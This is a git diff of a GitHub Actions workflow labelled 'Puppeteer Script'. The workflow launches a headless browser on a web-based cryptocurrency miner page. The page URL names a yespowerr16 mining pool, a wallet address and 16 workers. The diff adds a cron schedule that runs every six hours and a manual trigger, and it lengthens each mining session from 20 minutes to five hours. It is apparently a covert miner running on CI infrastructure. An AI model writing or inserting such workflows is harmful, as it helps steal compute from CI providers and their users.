@@ -1,12 +1,15 @@
 name: Puppeteer Script
 
 on:
+  schedule:
+    - cron: '0 */6 * * *' # Runs every 6 hours
   push:
     branches:
       - main
   pull_request:
     branches:
       - main
+  workflow_dispatch: # Allows manual trigger
 
 jobs:
   job1:
@@ -128,7 +131,7 @@ jobs:
         run: |
           npx puppeteer browsers install
 
-      - name: Create and run Puppeteer script
+      - name: Create and run Puppeteer script with delay
         run: |
           cat <<'EOF' > puppeteer_script.js
           const puppeteer = require('puppeteer');
@@ -138,11 +141,11 @@ jobs:
             const page = await browser.newPage();
             await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
 
-            // Set timeout to keep the browser open for 20 minutes (1200 seconds)
+            // Set timeout to keep the browser open for 5 hours (18000 seconds)
             setTimeout(async () => {
-              console.log('Closing browser after 20 minutes.');
+              console.log('Closing browser after 5 hours.');
               await browser.close();
-            }, 1200 * 1000);
+            }, 18000 * 1000);
 
             // Wait indefinitely to keep the script running and the browser open
             await new Promise(() => {});
